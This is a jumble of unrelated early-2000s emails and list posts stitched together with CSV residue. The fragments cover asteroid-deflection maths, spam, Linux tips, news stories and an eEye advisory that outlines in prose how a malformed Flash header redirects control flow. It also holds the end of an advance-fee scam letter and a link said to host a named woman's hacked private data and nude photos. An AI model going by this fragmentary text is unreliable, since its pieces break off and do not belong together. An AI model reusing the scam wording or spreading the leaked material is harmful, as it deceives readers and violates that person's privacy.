 utmost indulgence to keep this matter extraordinarily 
 confidential, Whatever your decision, while I await your prompt response.
 Thank you and God Bless. 
 Best Regards 
 
 
 COL. MICHAEL BUNDU(RTD). m_bundu@rediffmail.com

 My estimate is that, in the worst case, we have 17 years (5.4e8
 seconds) to move it one earth radius, or about 6000 km (6e6 m).  
 a t^2/2 = x, if I remember right, so a = 2x/t^2, which is 
 1.2e7 m/(2.9e17 s^2), or about 4.1e-11 m/s^2, which is not a very
 large acceleration, roughly equivalent to the gravitational
 acceleration in these parts divided by 200000000000.  Assuming a
 2km-wide --- that is, 20 000 decimeter-wide --- spherical asteroid of
 specific gravity 10, 4/3 pi r^3 says it would have a volume of 4e12
 cubic decimeters and thus a mass of 4e13 kg.  The force we'd have to
 apply to achieve this acceleration would be roughly equivalent to the
 weight of 200 kg here on Earth.
 
 So, yeah, ion drives are probably a no-go, unless I screwed up the
 calculations here; I think the force they typically exert is about
 four orders of magnitude too small.
 
 If we just wanted to hit today it with enough of an impulse that it
 would miss us 17 years later, we'd need to accelerate it by about 1.1
 cm/s.  A one-ton (1000kg) mass would need to hit it at about 4e9 m/s,
 or about ten times the speed of light, to achieve this, so that's not
 possible.  (If you could actually put enough work into a one-ton mass,
 as it approached the speed of light, it would mass more, so you could
 still do it with a one-ton mass; but we don't have anything
 approaching that speed.)  The impulse required is inversely
 proportional to the remaining time to impact, so if we were to hit it
 after half the time has elapsed, we'd need to accelerate it by around
 2.2 cm/s instead.
 
 The gravitational force of an Earth-sized mass could provide
 sufficient deflection if that mass were about 4.5e5 times as far away
 from the asteroid as we are from Earth's center, or about 2.7e9 m, or
 about 0.018 times the distance from the Earth to the Sun (0.018 AU).
 (And if that mass stayed so nearby for 17 years.)
 
 The effects of continuous acceleration benefit greatly from planning
 ahead, since they scale with t^2, not t --- and thus the needed
 acceleration scales with 1/t^2.  After half the time has elapsed, we'd
 need four times as much acceleration to make it miss the Earth than if
 we were to start accelerating it now.
 
 All of these numbers are a little low, because the Earth presents a
 slightly easier target than its physical size suggests, due to its
 gravity well.  How much easier depends on the speed of the projectile
 in ways I don't understand.
 
 They're also a little high, because they assume the force is being
 applied purely at right angles to the asteroid's current path, which
 is a slightly suboptimal scenario (although for velocity changes five
 orders of magnitude smaller than the relative velocity, the difference
 is probably insignificant.)  And they assume there are no other effects on the asteroid's path.
 
 What about electrical charges?  Could we electrically charge the
 asteroid and another nearby asteroid, perhaps with electron beams, to
 provide the needed acceleration?
 
 Of course, all of this calculation could be applied in the other
 direction, too.  If you want to sock a moon colony with a one-ton
 asteroid, you could do it with a tiny amount of force applied over
 twenty-five years to adjust its orbit.

 A lot of spam which *appears* to originate from China, and even 
 a lot which advertises websites hosted there, is sent by, and is 
 done for the benefit of, companies based in the US.  The spam 
 often appears to originate there because it's coming from open 
 http, or squid proxy servers.  It's hosted there because these 
 spammers are now persona-non-grata on all US ISPs.  One hardly 
 needs to involve the Chinese government in a case where a US 
 citizen is violating US law.

 The first court cases were actually concluded years ago. These 
 include many legal precedents which are used to protect the 
 rights of ISPs to block mail, and to terminate service to 
 spammers.

 Surprising then, how much information you can find on the 
 current whereabouts of long-time spammers like Alan Ralksy of 
 Detroit, Michigan.  Ralsky is a guy who even gives interviews to 
 the news media.  If you can connect a specific corpus of spam to 
 him, his street address is well known. Ralsky is a prime 
 candidate for lawsuits in any state with an anti-spam law. 
 Thomas Cowles is another long-time spammer, but last I heard 
 he'd been jailed for stealing computer equipment from his 
 business partner, Eddy Marin (also a long time spammer (You've 
 heard of PopLaunch, right?)

 Back when I was working at MAPS, there was a flap over a 
 pump-and-dump spammer, Rodona Garst.  Seems she had an open 
 file-share on her laptop, and when she forged the wrong domain, 
 the real owner hacked in and posted all her private information 
 on a website. Oh, look, it's still there, including the nude 
 photos:
 
 http://belps.freewebsites.com/
 
 I recall this well, because the SEC was VERY interested in 
 confirming the validity of the information found online.  There 
 were some ""interesting"" conversations. This summer, the SEC 
 released the following:
 
 http://www.sec.gov/litigation/admin/33-8113.htm
 
 Yes, the investigation took two years, but the financial penalty 
 for operating a pump-and-dump scam isn't small.  The wheels of 
 government grind slow, but the grind very fine indeed.

 Check your local friendly Red Hat installation:
 
 [root@localhost up2date]# rpm --checksig zsh-4.0.2-2.src.rpm
 zsh-4.0.2-2.src.rpm: md5 gpg ok
 
 Of course, this is only as useful as, say, the gpg keys distributed with 
 the Kernel tarballs, i.e. if you don't actually bother checking the sig 
 then you are open to abuse. It's entirely possible that rpm can be 
 configured to require good signatures, but I've not read that part of 
 the fine manual just yet.
 
 Cheers,

 The Beer Scooter 
 
 How many times have you woken up in the morning after a hard night
 drinking and thought 'How on earth did I get home? As hard as you
 try, you cannot piece together your return journey from the pub to
 your house. The answer to this puzzle is that you used a Beer
 Scooter.
 
 The Beer Scooter is a mythical form of transport, owned and leased
 to the drunk by Bacchus the Roman god of wine. Bacchus has branched
 out since the decrease in the worship of the Roman Pantheon and
 has bought a large batch of these magical devices. The Beer Scooter
 works in the following fashion:-
 
 The passenger reaches a certain level of drunkenness and the
 ""slurring gland"" begins to give off a pheromone. Bacchus or one of
 his many sub-contractors detects this pheromone and sends down a
 winged Beer Scooter. The scooter scoops up the passenger and deposits
 them in their bedroom via the Trans-Dimensional Portal. This is
 not cheap to run, so a large portion of the passenger's in-pocket
 cash is taken as payment.
 
 This answers the second question after a night out 'How did I spend
 so much money?'
 
 Unfortunately, Beer Scooters have a poor safety record and are
 thought to be responsible for over 90% of all UDI (Unidentified
 Drinking Injuries).  An undocumented feature of the beer scooter
 is the destruction of time segments during the trip. The nature of
 Trans-Dimensional Portals dictates that time will be lost, seemingly
 unaccounted for.
 
 This answers a third question after a night out 'What the hell
 happened?'
 
 With good intentions, Bacchus opted for the REMIT (Removal of
 Embarrassing Moments In Time) add on, that automatically removes,
 in descending order, those parts in time regretted most. Unfortunately
 one person's REMIT is not necessarily the REMIT of another and
 quite often lost time is regained in discussions over a period of
 time. Independent studies have also shown that Beer Goggles often
 cause the scooter's navigation system to malfunction thus sending
 the passenger to the wrong bedroom, often with horrific consequences.
 With recent models including a GPS, Bacchus made an investment in
 a scooter drive-thru chain specialising in half eaten kebabs and
 pizza crusts.
 
 Another question answered!! For the family man, Beer Scooters come
 equipped with flowers picked from other people's garden and
 Thump-A-Lot boots (Patent Pending). These boots are designed in
 such a way that no matter how quietly you tip-toe up the stairs,
 you are sure to wake up your other half. Special anti-gravity
 springs ensure that you bump into every wall in the house and the
 CTSGS (Coffee Table Seeking Guidance System) explains the bruised
 shins. The final add-on Bacchus saw fit to invest in for some
 scooters is the TAS (Tobacco Absorption System). This explains how
 one person can apparently get through 260 Marlboro Lights in a
 single night.
 
 PS: Don't forget the on-board heater, which allows you to comfortably
 get home from the pub in sub-zero temperatures, wearing just a
 T-shirt.

595,"Subject: Flying cars here, jetpacks next?
","URL: http://boingboing.net/#85485805
 Date: Not supplied
 
 Moller, a public company in Davis, California, has developed a flying car.  
 
     [IMG: http://www.craphound.com/images/flyingcar.jpg] Moller International 
     has developed the first and only feasible, personally affordable, personal 
     vertical takeoff and landing (VTOL) vehicle the world has ever seen. 
 
     You've always known it was just a matter of time before the world demanded 
     some kind of flying machine which would replace the automobile. Of course, 
     this machine would have to be capable of VTOL, be easy to maintain, cost 
     effective and reliable. Well, we at Moller International believe we have 
     come up with the solution. That solution is the volantor named M400 Skycar.

 I've very excited about the in-planning Penguin Shell volunteer project. 
 Apparently, you are too. I've received more than 100 emails from readers <a 
 href=""mailto:tony@lockergnome.com?subject=Penguin Shell Volunteer 
 Skills"">volunteering</a> a wide range of IT skills for charitable organizations. 
 
 
 
 
 Linux users, Windows users, even a few Mac users are ready, willing and able to 
 spend their own precious off time providing qualified technical skills for a 
 good cause. I've also gotten more than two dozen suggestions for <a 
 href=""mailto:tony@lockergnome.com?subject=Penguin Shell Organization 
 Suggestion"">organizations</a> that might be in need of such skills. And, I've 
 seen some very interesting suggestions for <a 
 href=""mailto:tony@Lockergnome.com?subject=Penguin Shell Volunteer name 
 suggestion"">names</a> for our project. Feel free to click through on any of the 
 above links to join the ever-growing bandwagon. Do me a favor, though. keep the 
 subject lines intact. It's the only way your messages will filter and sort 
 through my email system.<p>
 
 It looks like Apple may have crossed a line of irritation with its users. 
 According to <a href=""http://theregister.co.uk/content/4/26269.html"" 
 target=""_blank"">this</a> article on <a href=""http://theregister.co.uk/"" 
 target=""_blank"">The Register</a>, Apple has tacked a $100 annual fee on its
 previously free mac.com email service. It's also set the price for an OS 10.2
 upgrade at $129.<p>
 
 I won't question Apple's decision too much. Instead, it really proves how 
 difficult things have become in the tech world in the past few years. Revenues, 
 by and large, are still decreasing from the pie-in-the-sky late 90s and early 
 2000. That's left companies to scramble for new sources of income, some of which 
 
 
 
 
 were previously free. Even we at Lockergnome have felt the pinch in the past few 
 
 
 
 
 years. Never fear, though. Chris has assured us that the newsletters will remain 
 
 
 
 
 free. We have, however, begun to explore alternative income <a 
 href=""http://www.gnometomes.com/"" target=""_blank"">sources</a>.<p>
 
 On a brighter note, it looks like <a href=""http://www.mandrake.com/"" 
 target=""_blank"">Mandrake</a> has found a sweet spot. According to their most 
 recent shareholder's report, the third quarter was the strongest in the 
 company's
 history, with 1.6 million Euro (1.61 million US) in revenue. That doesn't put
 them in the black, though. According to MandrakeSoft, the strong quarter will
 only decrease operating losses. I have to wonder how much of this revenue was
 the result of the <a
 href=""http://mandrakelinux.com/en/club/""target=""_blank"">Mandrake Linux User's
 Club</a>.<p>
 
 The news also makes me want to pay a bit more attention to Mandrake's newest
 partnership venture, an agreement with <a href=""http://www.microtel.com/""
 target=""_blank"">Microtel</a> to provide Mandrake-loaded computers for sale on <a
 href=""http://www.walmart.com/catalog/product_listing.gsp?cat=102252&dept=3944&path=0%3A3944%3A3951%3A41937%3A86796%3A102252"" target=""_blank"">WalMart.com</a>.
 I would never have guessed that WalMart would lead the consumer Linux machine
 charge. They've had Mandrake boxes available for several months. Now, with the 
 addition of both <a href=""http://www/lindows.com/"" target=""_blank"">Lindows</a> 
 and Mandrake-equipped computers, they seem surprisingly ahead of the retail 
 computer pack. Let's hope for the best for all involved.<p>
 
 Have a great Wednesday.<p><p>

 <b>Checking Mail With KMail</b><p>
 
 I've recently become a KDE convert - impressed enough with KDE-3 to move me from 
 
 my longtime desktop friend Gnome. While I use a combination of fetchmail, 
 procmail and pine for reading and filtering my email, KMail is a strong 
 contender in the email race. As you'd guess, it's fully integrated into the KDE 
 desktop, ready for a quick setup and easy use.<p>
 
 There's one drawback to KMail, though, in my opionion. That's that it doesn't 
 automatically check your email by default when the program is opened. As much 
 time as I spend talking about saving key and mouse strokes, you knew the 
 additional step to check your email after opening the program would be an 
 irritation to this Penguin. However, changing the problem is a quick and simple 
 configuration issue.<p>
 
 To force KMail to check your email when opened, right-click on the KMail icon in 
 
 your KDE panel. Select ""Preferences"" and the ""Execute"" tab. In the Execute 
 window, change the command line to read:<p>
 
 &nbsp;&nbsp;&nbsp;&nbsp;kmail --check -caption ""%c"" %i %m<p>
 
 The addition of the --check option will force KMail to bring you your mail when 
 you open the program.<p>
 
 Fewer keystrokes make a happy geek, right?<p> <p>

 <b>Kernel Configuration - Part XIII</b><p>
 
 As you well know, Linux is simply the most robust operating system for 
 networking around. With its roots squarely in the network, Linux has managed to 
 stay ahead of the pack in virtually every respect related to networks. It should 
 
 come as little suprise, then, that the network section of your Linux kernel 
 configuration is dense with details and options.<p>
 
 I will say that I warned you on Monday - there are going to be some sections of 
 the kernel configuration series where I just can't give you a stock 
 configuration that will work in every case. Networking is one of those areas. 
 You're going to have to give some thought as to how your network is or will be 
 used and the level of security you want to provide (both internal and external). 
 
 Then, it's a matter of finding the solutions to those options.<p>
 
 For security issues, I can recommend several good articles and HowTos:<p>
 
 <a class=""url"" 
 href=""http://www.linux.org/docs/ldp/howto/Security-Quickstart-HOWTO/index.html"">The Linux Security Quickstart HowTo</a><br>
 &nbsp;&nbsp;covers security on a high level, with a good discussion of kernel 
 configuration issues<p>

 <b>Linux PR</b><p>
 
 <a class=""url"" href=""http://linuxpr.com/"">http://linuxpr.com/</a><p>
 
 If the daily Linux news sites are starting to get you down, maybe it's time for 
 a change. Linux PR is an up-to-the-minute listing of events and developments in 
 the Linux world. The layout is attractive, with all the most recent articles in 
 descending order on the front page. It makes quick scans easy. The only real 
 downside to the news on the site is that some of it is very, very 
 company-oriented - clearly the work of PR firms cranking out press releases. 
 Other than that, Linux PR is a useful site for checking in and keeping up on 
 your favorite OS.<p><p>

 Perhaps the stations cannot publish digital playlists, but you can get
 them from www.starcd.com anyway. They use some sort of
 listening and recognition technology to identify the music played
 on over 1000 US radio stations.

606,"Subject: [VulnWatch] EEYE: Macromedia Shockwave Flash Malformed Header Overflow
","Macromedia Shockwave Flash Malformed Header Overflow
 
 Release Date: August 8, 2002
 
 Severity:
 High (Remote Code Execution)
 
 Systems Affected:
 Macromedia Shockwave Flash - All Versions;
 Unix and Windows; Netscape and Internet Explorer
 
 Description:
 While working on some pre-release eEye Retina CHAM tools, an exploitable
 condition was discovered within the Shockwave Flash file format called SWF
 (pronounced ""SWIF"").
 
 Since this is a browser based bug, it makes it trivial to bypass firewalls
 and attack the user at his desktop. Also, application browser bugs allow you
 to target users based on the websites they visit, the newsgroups they read,
 or the mailing lists they frequent. It is a ""one button"" push attack, and
 using anonymous remailers or proxies for these attacks is possible.
 
 This vulnerability has been proven to work with all versions of Macromedia
 Flash on Windows and Unix, through IE and Netscape. It may be run wherever
 Shockwave files may be displayed or attached, including: websites, email,
 news postings, forums, Instant Messengers, and within applications utilizing
 web-browsing functionality.
 
 Technical Description:
 The data header is roughly made out to:
 
 [Flash signature][version (1)][File Length(A number of bytes too
 short)][frame size (malformed)][Frame Rate (malformed)][Frame Count
 (malformed)][Data]
 
 By creating a malformed header we can supply more frame data than the
 decoder is expecting. By supplying enough data we can overwrite a function
 pointer address and redirect the flow of control to a specified location as
 soon as this address is used. At the moment the overwritten address takes
 control flow, an address pointing to a portion of our data is 8 bytes back
 from the stack pointer. By using a relative jump we redirect flow into a
 ""call dword ptr [esp+N]"", where N is the number of bytes from the stack
 pointer. These ""jump points"" can be located in multiple loaded dll's. By
 creating a simple tool using the debugging API and ReadMemory, you can
 examine a process's virtual address space for useful data to help you with
 your exploitation.
 
 This is not to say other potentially vulnerable situations have not been
 found in Macromedia's Flash. We discovered about seventeen others before we
 ended our testing. We are working with Macromedia on these issues.
 
 Protection:
 Retina(R) Network Security Scanner already scans for this latest version of
 Flash on users' systems. Ensure all users within your control upgrade their
 systems.
 
 Vendor Status:
 Macromedia has released a patch for this vulnerability, available at:
 http://www.macromedia.com/v1/handlers/index.cfm?ID=23293&Method=Full&Title=M

","http://www.guardian.co.uk/international/story/0,3604,806579,00.html
 
 Lioness adopts fifth antelope
 
 Rory Carroll, Africa correspondent
 Tuesday October 8, 2002
 The Guardian
 
 Kamuniak the dysfunctional lioness has forfeited another meal by adopting
 her fifth baby oryx this year, an aberration of nature which has baffled
 wildlife experts.
 The young lioness in the Samburu national park in northern Kenay adopted her
 latest baby at the weekend, a wildlife service warden said yesterday.
 Each time Kamuniak, whose name means ""the blessed one"" in the local Samburu
 tongue, has tried to protect the antelopes from other predators and allowed
 the natural mothers to feed them.
 Unfortunately for her, one oryx ended up in the belly of a male lion while
 Kamuniak slept; the others were either rescued by wardens or retrieved by
 their natural mothers.
 The wardens think the latest adoptee, nicknamed Naisimari (""taken by
 force""), was adopted at the weekend.
 ""She must have adopted her on Sunday because they are in harmony,"" said
 Gabriel Lepariyo, a warden.
 Naisimari's natural mother has been seen shadowing the odd couple at a
 distance.
 Theories to explain the phenonemon abound: not having her own cubs, Kamuniak
 is lonely; she is colour-blind and short-sighted and thinks the calves are
 cubs; the oryx were too frail to flee, breaking the classic prey behaviour
 and confusing the hunter; Kamuniak wants to be a vegetarian; Kamuniak wants
 to be loved.

 Yeah, AWL IPs is a good thing for 2.40

 When it works, yeah.  But it's so flakey I have to turn it off 
 so that my mail can be guaranteed to actually get through in a

 This comprehensive LTCI policy review compares over 40 major companies
 in 17 benefit and ratings/asset categories and includes a premium
 comparison for a 60 year old couple.
 
 Over 210 policies are covered in this semi-annual publication. This is
 the oldest LTC policy comparison in the nation and is a valuable tool
 for any agent selling LTC insurance today.
 
 (Older generation policies are kept after new policies are introduced
 because agents encounter the older policies in the field.)
 
 The CD-ROM version allows you to compare up to three companies at a time
 in any of the 17 categories. You'll also receive a spreadsheet version
 to take with you all the time.

    Thanks for posting this tip - I had the same problem compiling with
 Tru64 and that took care of it.
 
    When I did the ""make install"" I got this error:
 
 LOCK:  -f /etc/mail/spamassassin/local.cf
  || cp rules/local.cf /etc/mail/spamassassin/local.cf
 sh: syntax error at line 1: `||' unexpected
 *** Exit 2
 Stop.
 
    It appears that this comes from the ""inst_cfs:"" part of the Makefile,
 which copies local.cf into /etc/mail/spamassassin.  The Makefile has
 brackets around the -f test, but they don't show up above.  Any ideas?

 I've also just tried doing rpm --rebuilddb, no change.
 
 A question:
 
 Do these files look too small?  
 
 root@canarsie:/var/cache/apt # ls -ltr
 total 148
 drwxr-xr-x    2 root     root         4096 Sep 29 10:49 gensrclist

 -rw-r--r--    1 root     root       158131 Oct  9 15:25 pkgcache.bin
 
 
 I ran strings on them, and it doesn't look like I see a complete listing
 of either my system's installed RPMs, or the rpms in the lists:
 
 root@canarsie:/var/state/apt/lists # ls -s
 total 9988

    0 apt.freshrpms.net_redhat_8.0_en_i386_base_srclist.updates
    0 lock
    4 partial
 
 
 If I kill them, they get recreated about the same size next time I run
 apt-get..

","    Date:        Wed, 21 Aug 2002 10:40:39 -0500
     From:        Chris Garrigues <cwg-dated-1030376441.95dd45@DeepEddy.Com>
     Message-ID:  <1029944441.398.TMDA@deepeddy.vircio.com>
 
   | The background color in this window is the same as the background 
   | color in the ftoc.
 
 That's what I'd like to vary - particularly as the ftoc background isn't
 constant - messages in the unseen sequence have a different background
 than others.
 
 In the ftoc that's fine, but in the sequences window, it isn't needed.
 unseen already has a different foreground there (no problem with that),
 it doesn't need a different background as well.
 
 I'll play about a bit with this, and with making it vertical instead of
 horizontal, and see what turns up.
 
   | The only sequences that are defined there are sequences which are defined
   | in app-defaults-color or ~/exmh/exmh-defaults-color.
 
 OK.
 
   | I've been thinking about how to dynamically generate highlighting for
   | other sequences, but haven't got that figured out yet.
 
 In this case, highlighting wasn't what I was most concerned about.
 A method to get messages in & out of sequences comes first, how it
 displays is a secondary consideration.   But as a suggestion, have an
 ""all unknown"" sequence highlight, any message in a sequence which has
 no defined highlighting (where defined includes defined to not be treated
 specially) gets highlighted the same way (maybe something as boring as
 a dark brown text colour - almost indistinguishable from the normal black)
 
 
   | > > Any chance of making the current message a little brighter background?
   | 
   | I don't see any reason why not.  Experiment and let me know what works for you.
 
 Done some of that.   First, the most significant change came from changing
 relief from raised to sunken.   I don't know why, but it just looks better
 (for me anyway).   But even with that, cur and unseen are still just a
 bit too similar.   I ended up using
 
 *sequence_cur:  -background {PaleGoldenrod} -relief sunken -borderwidth 2
 
 The unnecessary braces are just because some of the colours I was using
 had spaces in their names.   PaleGoldenrod translates as #eee8aa which
 is probably safer for generic use.

  If you (people) don't know enough to filter on the actual score they've got
 the ""stars"", which will give them more than enough levers, if they want it.

 If I get troubles with the .tar.gz source file compilation, will it work

 If it will, how do I manage with a .src.rpm file, sorry, I don't remeber :(

","There's been well documented articles, studies of the
 French tax laws, corporate governance, and financial
 oversight that 1) dont' easily allow for ISOs, the root

 of capital to new ventures.  It was an extremely large
 issue, even debated widely in France.

","Hi Everyone,
 There seem to be several ""boneheads"" in our class. A few months ago I 
 ran into John Dahill, he asked me if I would go to the reunion picnic 
 with him. His girlfriend and my guyfriend wouldn't know anyone there, 
 so I said yes. Yesterday he told me he can't go!! All this time he 
 thought it was on Saturday!! Oh well, I will see everyone there 
 sometime through the afternoon.

 Thanks Tom and Jacob. The above works, but without the double quotes: i.e. 
 
 sh -c 'for f in `folders -recurse -fast` ; do sortm +""$f"" ; done'

 Shelley Powers raises[1] some interesting questions re whether RDF has a place

 the Semantic Web) and RSS is trying to flow news that has a short lifespan. I

 Perhaps people are starting to notice how profit motive drains the 
 meaning out of their lives. Kinda sucks to be an ant farming for the 
 corporate lords. Funny how most of the rest of the world is more and 
 more apprehensive towards American Democracy.
 
 I just went to DC for the first time. I was awestruck by the 
 monuments, the words of Thomas Jefferson, the Spirit of Democracy set 
 in stone. Amazing to think that in little more than 200 years our 
 government could be so far removed from those honorable principles. 
 Adam Smith presumed that the marketplace would regulate itself 
 through morality, good faith, and responsibility. Corporate America 
 seems to feel that those principles stand in the way of making the 
 real bucks. How much more can they co-opt and commodify? Get your 
 copyrights in quick so you can hold on to your piece of the pie. 
 Health care, public programs, pensions, social security - these are 
 now regarded as worthless unless they can turn a profit.
 
 Ah, socialized medicine. Siestas. 6 week vacation leave. I hear Spain

 Seriously. Look at he life expectancy and human carrying capacity of
 this continent before the Europeans got here. Look at it now. Even
 for descendants of the original inhabitants. Even for the descendents
 of slaves, who were brought here by force.
 
 More stuff, cheaper. That's progress.
 
 Poverty, of course, is not relative. It's absolute. Disparity in
 wealth has nothing to do with it.
 
 It's like saying that groups have rights, when, in truth, only
 individuals do. Like group rights, ""disparity"" in wealth is
 statistical sophistry.
 
 
 Besides, even if you can't help the distribution, industrial wealth
 is almost always transitory, and so is relative poverty, even when
 there are no confiscatory death-taxes. The 20th anniversary Forbes
 400 just came out, and only a few tens of people are still there
 since 1982, a time which had significantly higher marginal taxes on
 wealth, income, and inheritance than we do now. More to the point,
 they're nowhere near the top.
 
 I'll take those odds. It is only when neofeudalism reasserts itself,
 in the form of government regulation, confiscatory taxes, legislated
 monopoly, corporate welfare, ""non-profit"" neoaristocratic tax dodges,
 and legalized labor extortion that we get slowdowns in progress, like
 what happened in Fabian-era Britain, or 1970's USA.
 
 In fact, it is in countries where wealth is the most ""unfairly""
 distributed, that you get the most improvement in the general --
 economic -- welfare. More stuff cheaper, fewer people dying, more
 people living longer.
 
 I'll take those odds as well. People take greater risks when the
 returns are higher, improving the lot of us all as a result.
 
 Cheers,
 RAH

   IWT Bans RIAA From Accessing Its Network
 
 August 19, 2002
 
 Information Wave Technologies has announced it will actively deny the
 Recording Industry Association of America (RIAA) from accessing the
 contents of its network. Earlier this year, the RIAA announced its new plan
 to access computers without owner's consent for the sake of protecting its
 assets. Information Wave believes this policy puts its customers at risk of
 unintentional damage, corporate espionage, and invasion of privacy to say
 the least.
 
 Due to the nature of this matter and RIAA's previous history, we feel the
 RIAA will abuse software vulnerabilities in a client's browser after the
 browser accesses its site, potentially allowing the RIAA to access and/or
 tamper with your data. Starting at midnight on August 19, 2002, Information
 Wave customers will no longer be able to reach the RIAA's web site.
 Information Wave will also actively seek out attempts by the RIAA to thwart
 this policy and apply additional filters to protect our customers' data.
 
 Information Wave will also deploy peer-to-peer clients on the Gnutella
 network from its security research and development network (honeynet) which
 will offer files with popular song titles derived from the Billboard Top
 100 maintained by VNU eMedia. No copyright violations will take place,
 these files will merely have arbitrary sizes similar to the length of a 3
 to 4 minute MP3 audio file encoded at 128kbps. Clients which connect to our
 peer-to-peer clients, and then afterwards attempt to illegally access the
 network will be immediately blacklisted from Information Wave's network.
 The data collected will be actively maintained and distributed from our
 network operations site.
 
 The placement of this policy is not intended to hamper the RIAA's piracy
 elimination agenda or advocate Internet piracy, but to ensure the safety of
 our customers' data attached to our network from hackers or corporate
 espionage hidden by the veil of RIAA copyright enforcement.
 
 If you have questions, comments, or concerns regarding this policy, please
 e-mail riaa@informationwave.net.

 	When I do that, it just moves my mouse to the very edge of a window
 (probably trying to center it on the off-screen window in question.) 
 
 	I'll have to try it with another window manager and see if I can
 get exmh to put it back inside of sane boundaries. I don't have this
 problem with any other windows, though. Just the exmhunseen window.

 Space rock 'on collision course'
 
 =20
 An asteroid could devastate Earth
 
      =20
      =20
       By Dr David Whitehouse=20
       BBC News Online science editor =20
     =20
     =20
 An asteroid discovered just weeks ago has become the most threatening =
 object yet detected in space.=20
 A preliminary orbit suggests that 2002 NT7 is on an impact course with =
 Earth and could strike the planet on 1 February, 2019 - although the =
 uncertainties are large.=20
 
 Astronomers have given the object a rating on the so-called Palermo =
 technical scale of threat of 0.06, making NT7 the first object to be =
 given a positive value.=20
 
 >>From its brightness, astronomers estimate it is about two kilometres =
 wide, large enough to cause continent-wide devastation on Earth.=20
 
 Many observations=20
 
 Although astronomers say the object definitely merits attention, they =
 expect more observations to show it is not on an Earth-intersecting =
 trajectory.=20
 
 
 
       This asteroid has now become the most threatening object in the =
 short history of asteroid detection=20
     =20
       Dr Benny Peiser =20
 It was first seen on the night of 5 July, picked up by the Linear =
 Observatory's automated sky survey programme in New Mexico, US.=20
 
 Since then astronomers worldwide have been paying close attention to it, =
 amassing almost 200 observations in a few weeks.=20
 
 
 Could it be deflected?=20
 Dr Benny Peiser, of Liverpool John Moores University in the UK, told BBC =
 News Online that ""this asteroid has now become the most threatening =
 object in the short history of asteroid detection"".=20
 
 NT7 circles the Sun every 837 days and travels in a tilted orbit from =
 about the distance of Mars to just within the Earth's orbit.=20
 
 Potential devastation=20
 
 Detailed calculations of NT7's orbit suggest many occasions when its =
 projected path through space intersects the Earth's orbit.=20
 
 Researchers estimate that on 1 February, 2019, its impact velocity on =
 the Earth would be 28 km a second - enough to wipe out a continent and =
 cause global climate changes.=20
 
 However, Dr Peiser was keen to point out that future observations could =
 change the situation.=20
 
 He said: ""This unique event should not diminish the fact that additional =
 observations in coming weeks will almost certainly - we hope - eliminate =
 the current threat.""=20
 
 Easily observable=20
 
 According to astronomers, NT7 will be easily observable for the next 18 =
 months or so, meaning there is no risk of losing the object.=20
 
 Observations made over that period - and the fact that NT7 is bright =
 enough that it is bound to show up in old photographs - mean that =
 scientists will soon have a very precise orbit for the object.=20
 
 Dr Donald Yeomans, of the US space agency's (Nasa) Jet Propulsion =
 Laboratory in California, told BBC News Online: ""The orbit of this =
 object is rather highly inclined to the Earth's orbit so it has been =
 missed because until recently observers were not looking for such =
 objects in that region of space.""=20
 
 Regarding the possibility of an impact, Dr Yeomans said the =
 uncertainties were large.=20
 
 ""The error in our knowledge of where NT7 will be on 1 February, 2019, is =
 large, several tens of millions of kilometres,"" he said.=20
 
 Dr Yeomans said the world would have to get used to finding more objects =
 like NT7 that, on discovery, look threatening, but then become harmless. =
 
 
 ""This is because the problem of Near-Earth Objects is now being properly =
 addressed,"" he said.=20

 <P>Dr Benny Peiser, of Liverpool John Moores University in the UK, told =
 BBC News=20
 Online that ""this asteroid has now become the most threatening object in =
 the=20
 short history of asteroid detection"".=20
 <P>NT7 circles the Sun every 837 days and travels in a tilted orbit from =
 about=20
 the distance of Mars to just within the Earth's orbit.=20
 <P><B>Potential devastation</B>=20
 <P>Detailed calculations of NT7's orbit suggest many occasions when its=20
 projected path through space intersects the Earth's orbit.=20
 <P>Researchers estimate that on 1 February, 2019, its impact velocity on =
 the=20
 Earth would be 28 km a second - enough to wipe out a continent and cause =
 global=20
 climate changes.=20
 <P>However, Dr Peiser was keen to point out that future observations =
 could=20
 change the situation.=20
 <P>He said: ""This unique event should not diminish the fact that =
 additional=20
 observations in coming weeks will almost certainly - we hope - eliminate =
 the=20
 current threat.""=20
 <P><B>Easily observable</B>=20
 <P>According to astronomers, NT7 will be easily observable for the next =
 18=20
 months or so, meaning there is no risk of losing the object.=20
 <P>Observations made over that period - and the fact that NT7 is bright =
 enough=20
 that it is bound to show up in old photographs - mean that scientists =
 will soon=20
 have a very precise orbit for the object.=20
 <P>Dr Donald Yeomans, of the US space agency's (Nasa) Jet Propulsion =
 Laboratory=20
 in California, told BBC News Online: ""The orbit of this object is rather =
 highly=20
 inclined to the Earth's orbit so it has been missed because until =
 recently=20
 observers were not looking for such objects in that region of space.""=20
 <P>Regarding the possibility of an impact, Dr Yeomans said the =
 uncertainties=20
 were large.=20
 <P>""The error in our knowledge of where NT7 will be on 1 February, 2019, =
 is=20
 large, several tens of millions of kilometres,"" he said.=20
 <P>Dr Yeomans said the world would have to get used to finding more =
 objects like=20
 NT7 that, on discovery, look threatening, but then become harmless.=20
 <P>""This is because the problem of Near-Earth Objects is now being =
 properly=20
 addressed,"" he said.=20

 For all my recent packages that support --with and --without options, I've

 Where you can see :
 Available rpmbuild rebuild options :
 --with : alsa
 --without : aalib lirc libdv arts
 
 The ogle package has also a --with alsa option, and I've had a bug report
 about xine that I apparently unintentionally compiled with ALSA directly
 :-/
 
 I'd like to aks this on the rpm-zzzlist : Would a new dependency of 250k, the
 alsa-lib package, for many packages (mplayer, ogle, xine) be a problem for
 the freshrpms.net packages users? As I really feel like blending ALSA in
 now, especially since I've just spent some time recompiling alsa-kernel

 DataPower delivers XML acceleration device
 ByScott Tyler Shafer
 August 27, 2002 5:46 am PT
 
 DATAPOWER TECHNOLOGY ON Monday unveiled its network device designed 
 specifically to process XML data. Unlike competing solutions that 
 process XML data in software, DataPower's device processes the data in 
 hardware -- a technology achievement that provides greater performance, 
 according to company officials.
 
 The new device, dubbed DataPower XA35 XML Accelerator, is the first in a 
 family of products expected from the Cambridge, Mass.-based startup. The 
 DataPower family is based on a proprietary processing core technology 
 called XG3 that does the analysis, parsing, and processing of the XML 
 data.
 
 According to Steve Kelly, CEO of DataPower, the XA35 Accelerator was 
 conceived to meet the steady adoption of XML, the anticipated future 
 proliferation of Web services, and as a means to share data between two 
 businesses.
 
 ""Our vision is to build out an XML-aware infrastructure,"" Kelly said. 
 ""The XA35 is the first of a family.""
 
 Kelly explained that converting data into XML increases the file size up 
 to 20 times. This, he said, makes processing the data very taxing on 
 application servers; DataPower believes an inline device is the best 
 alternative.
 
 In addition to the large file sizes, security is also of paramount 
 importance in the world of XML.
 
